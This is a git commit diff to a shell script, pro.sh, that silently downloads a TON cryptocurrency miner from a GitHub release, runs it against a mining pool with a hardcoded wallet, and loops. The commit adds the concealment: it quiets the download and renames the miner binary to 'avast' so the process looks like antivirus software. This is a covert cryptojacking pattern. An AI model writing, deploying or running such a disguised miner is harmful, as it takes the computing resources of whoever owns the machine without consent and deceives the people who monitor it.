9b6044aab8a68f12655693fb06afabc0684fc5b6
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 14:09:08 +0700

    Update pro.sh

--- pro.sh
+++ pro.sh
@@ -4,13 +4,15 @@
 
 #!/bin/bash
 
-wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 
+wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 
 
 tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
 
-chmod +x miner-linux >/dev/null 2>&1
+mv miner-linux avast
 
-./miner-linux https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+chmod +x avast >/dev/null 2>&1
+
+./avast https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
 
 while [ 1 ]; do
 
